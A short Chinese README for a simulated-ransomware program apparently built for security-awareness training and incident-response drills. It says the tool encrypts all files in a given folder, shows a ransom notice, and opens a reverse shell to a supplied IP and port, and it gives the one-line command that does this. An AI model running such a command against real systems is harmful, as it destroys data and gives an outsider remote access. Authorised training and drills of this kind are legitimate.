## 使用场景
因安服需要进行应急演练及安全意识教育，不能对生产环境造成破坏，故使用模拟勒索进行演示，达到寓教于乐的效果

### 声明

本程序仅模拟勒索病毒环境，加密指定文件夹下的所有文件，在加密完成后显示勒索提示;提供IP及端口可进行反弹shell。 

仅供学习或用于安全意识培训提供参考，未经授权请勿进行破坏性测试，利用提供的信息造成的直接或间接损失，由使用者承担。

### 使用方法

使用参数-h查看
![image-20230531182210373](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230531182210373.png)

#### 给定IP端口反弹shell,加密指定文件夹中的文件

``` 
racket.exe -H IP -P port "C:\Users\Administrator\Desktop\test"
```

![image-20230531191933670](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230531191933670.png)

#### 

![image-20230531192758763](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20230531192758763.png)